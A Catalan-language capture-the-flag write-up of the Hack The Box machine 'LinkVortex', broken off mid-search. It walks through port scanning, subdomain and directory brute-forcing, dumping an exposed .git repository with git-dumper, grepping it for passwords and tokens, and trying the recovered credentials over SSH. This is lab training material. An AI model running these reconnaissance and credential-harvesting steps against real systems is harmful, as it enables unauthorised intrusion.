Anirem directament al reconeixement actiu, fent un nmap directament i saltant-nos el reconeixement passiu:
```
──(kali㉿kali)-[~]
└─$ nmap -sC -sV -v 10.10.11.47
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-08 09:52 CET
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 09:52
Completed NSE at 09:52, 0.00s elapsed
Initiating NSE at 09:52
Completed NSE at 09:52, 0.00s elapsed
Initiating NSE at 09:52
Completed NSE at 09:52, 0.00s elapsed
Initiating Ping Scan at 09:52
Scanning 10.10.11.47 [4 ports]
Completed Ping Scan at 09:52, 0.15s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 09:52
Completed Parallel DNS resolution of 1 host. at 09:52, 0.04s elapsed
Initiating SYN Stealth Scan at 09:52
Scanning 10.10.11.47 [1000 ports]
Discovered open port 80/tcp on 10.10.11.47
Discovered open port 22/tcp on 10.10.11.47
Completed SYN Stealth Scan at 09:52, 1.06s elapsed (1000 total ports)
Initiating Service scan at 09:52
Scanning 2 services on 10.10.11.47
Completed Service scan at 09:52, 6.19s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.47.
Initiating NSE at 09:52
Completed NSE at 09:52, 2.43s elapsed
Initiating NSE at 09:52
Completed NSE at 09:52, 0.41s elapsed
Initiating NSE at 09:52
Completed NSE at 09:52, 0.00s elapsed
Nmap scan report for 10.10.11.47
Host is up (0.041s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
80/tcp open  http    Apache httpd
|_http-title: Did not follow redirect to http://linkvortex.htb/
|_http-server-header: Apache
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 09:52
Completed NSE at 09:52, 0.00s elapsed
Initiating NSE at 09:52
Completed NSE at 09:52, 0.00s elapsed
Initiating NSE at 09:52
Completed NSE at 09:52, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.02 seconds
           Raw packets sent: 1004 (44.152KB) | Rcvd: 1001 (40.048KB)

```

Trobem dos ports oberts, accés a una web pel port 80 i a la que tinguem unes credencials ens podrem connectar per SSH ja que també hi ha accés al port 22 que és el port ssh per defecte. Ara, per tant, afegirem al fitxer /etc/hosts aquesta IP i l'associarem al nom de domini linkvortex.htb.

Abans de anar al port 80 per el navegador però, farem un wget/curl i un whatweb per veure que hi ha.

```
┌──(kali㉿kali)-[~]
└─$ whatweb http://linkvortex.htb                                                                   
http://linkvortex.htb [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[10.10.11.47], JQuery[3.5.1], MetaGenerator[Ghost 5.58], Open-Graph-Protocol[website], PoweredBy[Ghost,a], Script[application/ld+json], Title[BitByBit Hardware], X-Powered-By[Express], X-UA-Compatible[IE=edge]
```

Amb aquest whatweb veiem informació que ens pot ser rellevant:


El framework Ghost que és un sistema de gestió de continguts (CMS). En aquest cas, la versió és la 5.58. Cal buscar si hi ha vulnerabilitats conegudes per aquesta versió. He vist per internet que Ghost sovint funciona amb node.js i el framework Express pel que veiem, o sigui que potser a algun lloc veiem la versió i és vulnerable.

JQuery 3.5.1 es pot investigar si és vulnerable a problemes com Cross-Site Scripting (XSS). També hi ha Open-Graph i compatibilitat amb IE, tocarà investigar-ho.

Ara fem un curl:
```

┌──(kali㉿kali)-[~]
└─$ curl http://linkvortex.htb
<!DOCTYPE html>
<html lang="en">
<head>

    <title>BitByBit Hardware</title>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="HandheldFriendly" content="True" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    
    <link rel="preload" as="style" href="/assets/built/screen.css?v=73b5f46ae9" />
    <link rel="preload" as="script" href="/assets/built/casper.js?v=73b5f46ae9" />

    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css?v=73b5f46ae9" />

    <meta name="description" content="Your trusted source for detailed, easy-to-understand computer parts info">
    <link rel="canonical" href="http://linkvortex.htb/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    
    <meta property="og:site_name" content="BitByBit Hardware">
    <meta property="og:type" content="website">
    <meta property="og:title" content="BitByBit Hardware">
    <meta property="og:description" content="Your trusted source for detailed, easy-to-understand computer parts info">
    <meta property="og:url" content="http://linkvortex.htb/">
    <meta property="article:publisher" content="https://www.facebook.com/ghost">
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="BitByBit Hardware">
    <meta name="twitter:description" content="Your trusted source for detailed, easy-to-understand computer parts info">
    <meta name="twitter:url" content="http://linkvortex.htb/">
    <meta name="twitter:site" content="@ghost">
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "WebSite",
    "publisher": {
        "@type": "Organization",
        "name": "BitByBit Hardware",
        "url": "http://linkvortex.htb/",
        "logo": {
            "@type": "ImageObject",
            "url": "http://linkvortex.htb/favicon.ico"
        }
    },
    "url": "http://linkvortex.htb/",
    "mainEntityOfPage": "http://linkvortex.htb/",
    "description": "Your trusted source for detailed, easy-to-understand computer parts info"
}
    </script>

    <meta name="generator" content="Ghost 5.58">
    <link rel="alternate" type="application/rss+xml" title="BitByBit Hardware" href="http://linkvortex.htb/rss/">
    
    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/sodo-search.min.js" data-key="054f7096476b0e8c7ec591c72c" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/main.css" data-sodo-search="http://linkvortex.htb/" crossorigin="anonymous"></script>
    
    <link href="http://linkvortex.htb/webmentions/receive/" rel="webmention">
    <script defer src="/public/cards.min.js?v=73b5f46ae9"></script><style>:root {--ghost-accent-color: #1c1719;}</style>
    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=73b5f46ae9">

</head>
<body class="home-template is-head-left-logo has-cover">
<div class="viewport">

    <header id="gh-head" class="gh-head outer">
        <div class="gh-head-inner inner">
            <div class="gh-head-brand">
                <a class="gh-head-logo no-image" href="http://linkvortex.htb">
                        BitByBit Hardware
                </a>
                <button class="gh-search gh-icon-btn" aria-label="Search this site" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
                <button class="gh-burger"></button>
            </div>

            <nav class="gh-head-menu">
                <ul class="nav">
    <li class="nav-home nav-current"><a href="http://linkvortex.htb/">Home</a></li>
    <li class="nav-about"><a href="http://linkvortex.htb/about/">About</a></li>
</ul>

            </nav>

            <div class="gh-head-actions">
                        <button class="gh-search gh-icon-btn" data-ghost-search><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
            </div>
        </div>
    </header>

    <div class="site-content">
        
<div class="site-header-content outer">


        <div class="site-header-inner inner">
                    <h1 class="site-title">BitByBit Hardware</h1>
                <p class="site-description">Your trusted source for detailed, easy-to-understand computer parts info</p>
        </div>

</div>

<main id="site-main" class="site-main outer">
<div class="inner posts">

    <div class="post-feed">
            
<article class="post-card post no-image keep-ratio">


    <div class="post-card-content">

        <a class="post-card-content-link" href="/psu/">
            <header class="post-card-header">
                <div class="post-card-tags">
                </div>
                <h2 class="post-card-title">
                    The Power Supply
                </h2>
            </header>
                <div class="post-card-excerpt">A power supply unit (PSU) converts the alternating current (AC) from your wall outlet into direct current (DC) that the computer components require. It supplies power to the motherboard, CPU, GPU, storage drives, fans, and other peripherals. Without a functioning PSU, a computer cannot operate.

Functions of a Power Supply</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2024-08-05">Aug 5, 2024</time>
                <span class="post-card-meta-length">2 min read</span>
        </footer>

    </div>

</article>
            
<article class="post-card post no-image keep-ratio">


    <div class="post-card-content">

        <a class="post-card-content-link" href="/storage-drive/">
            <header class="post-card-header">
                <div class="post-card-tags">
                </div>
                <h2 class="post-card-title">
                    The CMOS
                </h2>
            </header>
                <div class="post-card-excerpt">CMOS is a type of semiconductor technology used to store small amounts of data on the motherboard. This data includes system settings and configuration information required for the computer to boot correctly. In modern systems, CMOS technology is primarily used in the CMOS RAM chip, which is powered by a</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2024-05-07">May 7, 2024</time>
                <span class="post-card-meta-length">2 min read</span>
        </footer>

    </div>

</article>
            
<article class="post-card post no-image keep-ratio">


    <div class="post-card-content">

        <a class="post-card-content-link" href="/vga/">
            <header class="post-card-header">
                <div class="post-card-tags">
                </div>
                <h2 class="post-card-title">
                    The Video Graphics Array
                </h2>
            </header>
                <div class="post-card-excerpt">The term VGA can refer to either the Video Graphics Array specification or the physical VGA connector often used for computer video output. Below, I'll provide a comprehensive overview of both aspects to give you a full understanding of VGA in the context of computer hardware and display technology.


Video</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2024-04-16">Apr 16, 2024</time>
                <span class="post-card-meta-length">2 min read</span>
        </footer>

    </div>

</article>
            
<article class="post-card post no-image keep-ratio">


    <div class="post-card-content">

        <a class="post-card-content-link" href="/ram/">
            <header class="post-card-header">
                <div class="post-card-tags">
                </div>
                <h2 class="post-card-title">
                    The Random Access Memory
                </h2>
            </header>
                <div class="post-card-excerpt">Random Access Memory (RAM) is a crucial component in all computing devices, serving as the main short-term data storage space. RAM stores the data and programs that a CPU needs in real time or near real time. Unlike hard drives or SSDs (Solid State Drives), which store data permanently, RAM</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2024-04-01">Apr 1, 2024</time>
                <span class="post-card-meta-length">2 min read</span>
        </footer>

    </div>

</article>
            
<article class="post-card post no-image keep-ratio">


    <div class="post-card-content">

        <a class="post-card-content-link" href="/cmos/">
            <header class="post-card-header">
                <div class="post-card-tags">
                </div>
                <h2 class="post-card-title">
                    The Motherboard
                </h2>
            </header>
                <div class="post-card-excerpt">A motherboard is a complex printed circuit board (PCB) that facilitates communication between all critical electronic components of a computer, including the CPU (Central Processing Unit), memory (RAM), storage devices, video cards, and other peripheral devices. It distributes power to these components and allows for communication between the CPU, memory,</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2024-03-11">Mar 11, 2024</time>
                <span class="post-card-meta-length">2 min read</span>
        </footer>

    </div>

</article>
            
<article class="post-card post no-image keep-ratio">


    <div class="post-card-content">

        <a class="post-card-content-link" href="/cpu/">
            <header class="post-card-header">
                <div class="post-card-tags">
                </div>
                <h2 class="post-card-title">
                    The Central Processing Unit
                </h2>
            </header>
                <div class="post-card-excerpt">The Central Processing Unit (CPU), often simply referred to as the processor, is the primary component of a computer that performs most of the processing inside a computer. To understand its significance, it's important to dive into its architecture, functions, and how it integrates within the broader context of computer</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2023-12-11">Dec 11, 2023</time>
                <span class="post-card-meta-length">2 min read</span>
        </footer>

    </div>

</article>
    </div>

    <nav class="pagination">
    <span class="page-number">Page 1 of 1</span>
</nav>


</div>
</main>

    </div>

    <footer class="site-footer outer">
        <div class="inner">
            <section class="copyright"><a href="http://linkvortex.htb">BitByBit Hardware</a> &copy; 2024</section>
            <nav class="site-footer-nav">
                <ul class="nav">
    <li class="nav-sign-up nav-current"><a href="#/portal/">Sign up</a></li>
</ul>

            </nav>
            <div class="gh-powered-by"><a href="https://ghost.org/" target="_blank" rel="noopener">Powered by Ghost</a></div>
        </div>
    </footer>

</div>


<script
    src="https://code.jquery.com/jquery-3.5.1.min.js"
    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
    crossorigin="anonymous">
</script>
<script src="/assets/built/casper.js?v=73b5f46ae9"></script>
<script>
$(document).ready(function () {
    // Mobile Menu Trigger
    $('.gh-burger').click(function () {
        $('body').toggleClass('gh-head-open');
    });
    // FitVids - Makes video embeds responsive
    $(".gh-content").fitVids();
});
</script>



</body>
</html>
                                         
```

Amb aquest curl hi ha llibreries externes de jquery carregades sense una verificació estricta, i s'haurà de mirar el codi personalitzat que es carrega a veure si s'hi pot fer XSS. El més rellevant potser és que hi ha un software que s'anomena Ghost, i veiem la versió que té, si trobem exploits per ell els podríem utilitzar: `<meta name="generator" content="Ghost 5.58">`. També hi ha recursos que no es carreguen per https i es carreguen per http. Haurem de veure si alguna d'aquestes coses ens és útil.

Ara anirem a la pàgina web a veure què veiem:

![image](https://github.com/user-attachments/assets/0dee336b-0c0d-457e-aa33-fc11563a8099)


A sota de tot veiem powered by ghost, el software que hem comentat abans al fer el curl, i hi ha un formulari de login:

![image](https://github.com/user-attachments/assets/77e9b4bc-aabe-423a-a63a-e59744cff4a7)


Al clicar el formulari de Sign up no carrega res, però si que veiem que la url canvia:

![image](https://github.com/user-attachments/assets/d92b40bb-8cfc-4903-9fcd-337e692fd641)


Per tant, ara faré un escaneig de subdominis i dominis a veure si aconseguim alguna cosa més. Amb l'escaneig de subdominis fet amb fuff i amb el fitxer de subdominis més gros que tinc a la màquina kali i hem trobat un subdomini -> dev.linkvortex.htb:

```
┌──(kali㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/amass/subdomains-top1mil-110000.txt -u http://linkvortex.htb -H "Host:FUZZ.linkvortex.htb" -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://linkvortex.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/amass/subdomains-top1mil-110000.txt
 :: Header           : Host: FUZZ.linkvortex.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

dev                     [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 322ms]
:: Progress: [114606/114606] :: Job [1/1] :: 332 req/sec :: Duration: [0:14:25] :: Errors: 0 ::
```

Abans d'accedir-hi però, farem l'escaneig de dominis a veure si trobem alguna cosa més, en aquesta ocasió ho he fet amb fuff, però no he trobat res rellevant, he filtrat per els que retornen un codi 200 de resposta del servidor, ja que de 301 n'hi havia masses i era impossible filtrar. Per tant, ara anirem al subdomini que hem trobat: dev.linkvortex.htb. Al subdomini si hi anem a través del navegador ens trobem amb que hi ha un avís que la pàgina està en construcció i que en breus la llençaran i estarà en funcionament:

![image](https://github.com/user-attachments/assets/c2e87ecd-4ab2-410e-a9eb-557b88276f02)

Ara, cercarem a aquest subdomini directoris o fitxers que ens puguin ser útils amb dirb, per canviar una mica d'eina:

```                                                                                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ dirb http://dev.linkvortex.htb /usr/share/wordlists/dirb/common.txt


-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Dec  9 13:42:22 2024
URL_BASE: http://dev.linkvortex.htb/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://dev.linkvortex.htb/ ----
+ http://dev.linkvortex.htb/.git/HEAD (CODE:200|SIZE:41)                                                                                                                                                                                  
+ http://dev.linkvortex.htb/cgi-bin/ (CODE:403|SIZE:199)                                                                                                                                                                                  
+ http://dev.linkvortex.htb/index.html (CODE:200|SIZE:2538)                                                                                                                                                                               
+ http://dev.linkvortex.htb/server-status (CODE:403|SIZE:199)                                                                                                                                                                             
                                                                                                                                                                                                                                          
-----------------
END_TIME: Mon Dec  9 13:51:01 2024
DOWNLOADED: 4612 - FOUND: 4
```

Sembla que l'únic interessant trobat és el que sembla ser un repositori de GitHub, anirem a la URL a veure què trobem i també podem descarregarlo a veure què hi ha ja que això indica que el repositori Git és accessible al servidor. Això pot ser una vulnerabilitat seriosa, ja que et permet descarregar el repositori complet i accedir al seu historial, commits, i fitxers sensibles que podrien haver estat eliminats però segueixen estant disponibles al repositori. Efectivament, si anem a la ruta a través de la url veiem el repositori i podem accedir als seus fitxers i directoris:

![image](https://github.com/user-attachments/assets/054034fe-ba1b-42bd-a554-e6db5867aa73)


![image](https://github.com/user-attachments/assets/660a407a-8821-47f0-9240-84a0381d6a62)

I si fem amb `gobuster del domini, amb un reconeixement de directoris trobem el següent també:
````
┌──(kali㉿kali)-[~]
└─$ gobuster dir --url http://linkvortex.htb --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  --exclude-length 0

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://linkvortex.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          0
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 179] [--> /assets/]
/LICENSE              (Status: 200) [Size: 1065]
/ghost                (Status: 200) [Size: 1065]
/server-status        (Status: 403) [Size: 199]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
````

On si anem a http://linkvortex.htb/ghost veiem un dashboard on fer login.

El que faré serà descarregar el repositori amb les dades que hi ha al fitxer config:
```
┌──(kali㉿kali)-[~/Documents/LinkVortex]
└─$ git clone https://github.com/TryGhost/Ghost.git
Cloning into 'Ghost'...
remote: Enumerating objects: 405239, done.
remote: Counting objects: 100% (3604/3604), done.
remote: Compressing objects: 100% (1572/1572), done.
remote: Total 405239 (delta 2396), reused 2903 (delta 1992), pack-reused 401635 (from 1)
Receiving objects: 100% (405239/405239), 322.77 MiB | 6.11 MiB/s, done.
Resolving deltas: 100% (273926/273926), done.
                                                                                                                           
┌──(kali㉿kali)-[~/Documents/LinkVortex]
└─$ ls -la
total 12
drwxrwxr-x 3 kali kali 4096 Dec 10 10:57 .
drwxr-xr-x 5 kali kali 4096 Dec 10 10:57 ..
drwxrwxr-x 9 kali kali 4096 Dec 10 10:59 Ghost
```

On veiem que hi ha ghost també, com el directori que hem trobat amb gobuster que té un dashboard...

```
┌──(kali㉿kali)-[~/Documents/LinkVortex]
└─$ cd Ghost     
                                                                                                                           
┌──(kali㉿kali)-[~/Documents/LinkVortex/Ghost]
└─$ ls -la
total 1540
drwxrwxr-x  9 kali kali    4096 Dec 10 10:59 .
drwxrwxr-x  3 kali kali    4096 Dec 10 10:57 ..
drwxrwxr-x  2 kali kali    4096 Dec 10 10:59 .devcontainer
drwxrwxr-x  5 kali kali    4096 Dec 10 10:59 .docker
-rw-rw-r--  1 kali kali      62 Dec 10 10:59 .dockerignore
-rw-rw-r--  1 kali kali     312 Dec 10 10:59 .editorconfig
drwxrwxr-x  8 kali kali    4096 Dec 10 10:59 .git
-rw-rw-r--  1 kali kali     122 Dec 10 10:59 .gitattributes
drwxrwxr-x  7 kali kali    4096 Dec 10 10:59 .github
-rw-rw-r--  1 kali kali    3276 Dec 10 10:59 .gitignore
-rw-rw-r--  1 kali kali     270 Dec 10 10:59 .gitmodules
drwxrwxr-x  2 kali kali    4096 Dec 10 10:59 .vscode
-rw-rw-r--  1 kali kali    1065 Dec 10 10:59 LICENSE
-rw-rw-r--  1 kali kali    2687 Dec 10 10:59 PRIVACY.md
-rw-rw-r--  1 kali kali    5187 Dec 10 10:59 README.md
-rw-rw-r--  1 kali kali     518 Dec 10 10:59 SECURITY.md
drwxrwxr-x 12 kali kali    4096 Dec 10 10:59 apps
-rw-rw-r--  1 kali kali    1794 Dec 10 10:59 compose.yml
drwxrwxr-x 88 kali kali    4096 Dec 10 10:59 ghost
-rw-rw-r--  1 kali kali    1113 Dec 10 10:59 nx.json
-rw-rw-r--  1 kali kali    4369 Dec 10 10:59 package.json
-rw-rw-r--  1 kali kali 1479141 Dec 10 10:59 yarn.lock
```

Ara tocarà revisar la informació del repositori descarregat i a veure què trobem que ens pugui ser d'utilitat.

Primer de tot he fet un grep per veure què podem trobar dins el repo, però hem trobat massa coses resultant en un output massa gros:

``grep -Ri "password\|secret\|token\|key\|user" .``

Per tant, he buscat per internet i he vist que hi ha un script/eina en python per poder reconstruir i descarregar completament repositoris i la provarem a veure si funciona. Ho he tret d'aquest repositori: https://github.com/arthaud/git-dumper i aquí hi ha el mateix: https://pypi.org/project/git-dumper/

Ara, l'instal·laré a veure si ens funciona i podem reconstruir el repositori que hem descarregat:

```
┌──(kali㉿kali)-[~/Documents]
└─$ pip install git-dumper
Defaulting to user installation because normal site-packages is not writeable
Collecting git-dumper
  Downloading git_dumper-1.0.8-py3-none-any.whl.metadata (3.0 kB)
Requirement already satisfied: PySocks in /usr/lib/python3/dist-packages (from git-dumper) (1.7.1)
Requirement already satisfied: requests in /usr/lib/python3/dist-packages (from git-dumper) (2.32.3)
Requirement already satisfied: beautifulsoup4 in /usr/lib/python3/dist-packages (from git-dumper) (4.12.3)
Collecting dulwich (from git-dumper)
  Downloading dulwich-0.22.6-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (4.3 kB)
Collecting requests-pkcs12 (from git-dumper)
  Downloading requests_pkcs12-1.25-py3-none-any.whl.metadata (3.5 kB)
Requirement already satisfied: soupsieve>1.2 in /usr/lib/python3/dist-packages (from beautifulsoup4->git-dumper) (2.6)
Requirement already satisfied: urllib3>=1.25 in /usr/lib/python3/dist-packages (from dulwich->git-dumper) (2.2.3)
Requirement already satisfied: certifi>=2017.4.17 in /usr/lib/python3/dist-packages (from requests->git-dumper) (2024.8.30)
Requirement already satisfied: charset-normalizer<4,>=2 in /usr/lib/python3/dist-packages (from requests->git-dumper) (3.3.2)
Requirement already satisfied: idna<4,>=2.5 in /usr/lib/python3/dist-packages (from requests->git-dumper) (3.8)
Requirement already satisfied: cryptography>=42.0.0 in /usr/lib/python3/dist-packages (from requests-pkcs12->git-dumper) (42.0.5)
Downloading git_dumper-1.0.8-py3-none-any.whl (9.4 kB)
Downloading dulwich-0.22.6-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (981 kB)
   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 981.3/981.3 kB 6.9 MB/s eta 0:00:00
Downloading requests_pkcs12-1.25-py3-none-any.whl (6.1 kB)
Installing collected packages: dulwich, requests-pkcs12, git-dumper
Successfully installed dulwich-0.22.6 git-dumper-1.0.8 requests-pkcs12-1.25
                                                                               
````

Ara descarregarem i  reconstruirem el repositori una altra vegada però amb aquesta eina:

```
┌──(kali㉿kali)-[~/Documents]
└─$ git-dumper http://dev.linkvortex.htb/.git/ ~/linkvortex

[-] Testing http://dev.linkvortex.htb/.git/HEAD [200]
[-] Testing http://dev.linkvortex.htb/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://dev.linkvortex.htb/.gitignore [404]
[-] http://dev.linkvortex.htb/.gitignore responded with status code 404
[-] Fetching http://dev.linkvortex.htb/.git/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/refs/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/HEAD [200]
[-] Fetching http://dev.linkvortex.htb/.git/config [200]
[-] Fetching http://dev.linkvortex.htb/.git/description [200]
[-] Fetching http://dev.linkvortex.htb/.git/packed-refs [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/logs/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/index [200]
[-] Fetching http://dev.linkvortex.htb/.git/info/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/shallow [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/refs/tags/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/logs/HEAD [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-merge-commit.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-commit.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/post-update.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/fsmonitor-watchman.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/commit-msg.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-push.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/push-to-checkout.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/update.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/e6/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/50/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-receive.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/pack/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/info/exclude [200]
[-] Fetching http://dev.linkvortex.htb/.git/refs/tags/v5.57.3 [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/e6/54b0ed7f9c9aedf3180ee1fd94e7e43b29f000 [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/50/864e0261278525197724b394ed4292414d9fec [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/pack/pack-0b802d170fe45db10157bb8e02bfc9397d5e9d87.idx [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/pack/pack-0b802d170fe45db10157bb8e02bfc9397d5e9d87.pack [200]
[-] Sanitizing .git/config
[-] Running git checkout .
Updated 5596 paths from the index`
```

I ara ja tenim el repositori descarregat i reconstruit amb aquesta eina:

```
`┌──(kali㉿kali)-[~/Documents/LinkVortex]
└─$ cd ~/linkvortex

                                                                                                                                 
┌──(kali㉿kali)-[~/linkvortex]
└─$ ls
Dockerfile.ghost  LICENSE  PRIVACY.md  README.md  SECURITY.md  apps  ghost  nx.json  package.json  yarn.lock
                                                                                                                                 
┌──(kali㉿kali)-[~/linkvortex]
└─$ ls -la                     
total 1432
drwxrwxr-x  7 kali kali    4096 Dec 14 09:38 .
drwx------ 20 kali kali    4096 Dec 14 09:38 ..
-rw-rw-r--  1 kali kali     312 Dec 14 09:38 .editorconfig
drwxrwxr-x  7 kali kali    4096 Dec 14 09:38 .git
-rw-rw-r--  1 kali kali     122 Dec 14 09:38 .gitattributes
drwxrwxr-x  7 kali kali    4096 Dec 14 09:38 .github
-rw-rw-r--  1 kali kali    3082 Dec 14 09:38 .gitignore
-rw-rw-r--  1 kali kali     135 Dec 14 09:38 .gitmodules
drwxrwxr-x  2 kali kali    4096 Dec 14 09:38 .vscode
-rw-rw-r--  1 kali kali     521 Dec 14 09:38 Dockerfile.ghost
-rw-rw-r--  1 kali kali    1065 Dec 14 09:38 LICENSE
-rw-rw-r--  1 kali kali    2860 Dec 14 09:38 PRIVACY.md
-rw-rw-r--  1 kali kali    5413 Dec 14 09:38 README.md
-rw-rw-r--  1 kali kali     518 Dec 14 09:38 SECURITY.md
drwxrwxr-x  8 kali kali    4096 Dec 14 09:38 apps
drwxrwxr-x 80 kali kali    4096 Dec 14 09:38 ghost
-rw-rw-r--  1 kali kali     888 Dec 14 09:38 nx.json
-rw-rw-r--  1 kali kali    3547 Dec 14 09:38 package.json
-rw-rw-r--  1 kali kali 1385302 Dec 14 09:38 yarn.lock
```

Ara toca remenar a veure si trobem alguna credencial o pista que ens pugui portar a alguna credencial per dins dels fitxers. Després de literalment hores de cerca als fitxers del repo, he trobat una contrasenya lligada a vàris mails de test, aquí en poso un només de mail però l'he trobat lligada a vàris mails:

```
const email = 'test@example.com';
const password = 'thisissupersafe';
```

I sembla que és una contrasenya que havien canviat:

```
password_reset: [{
                        token: token,
                        newPassword: 'thisissupersafe',
                        ne2Password: 'thisissupersafe'
                    }]
```


També apareix vàries vegades la password ``password: '12345678910'``  i també hi ha una password que és la següent:

```
const email = 'test@example.com';
const password = 'OctopiFociPilfer45';
```

Provarem aquestes credencials a veure i alguna ens serveix per accedir per ssh a la màquina. No hi ha hagut èxit al provar per ssh.

Ara buscaré altra vegada contrasenyes dins el repositori a veure si trobo un correu complert com aquest test@example.com però que no sigui de test ja que el de test no ha funcionat. Provo de fer un grep al repositori però en comptes de amb test amb admin@ a veure si trobem algun usuari que sembli vàlid:

````
┌──(kali㉿kali)-[~/Documents/LinkVortex/Ghost]
└─$ grep -r "admin@" .

./ghost/admin/tests/acceptance/staff-test.js://             admin = this.server.create('user', {email: 'admin@example.com', roles: [adminRole]});
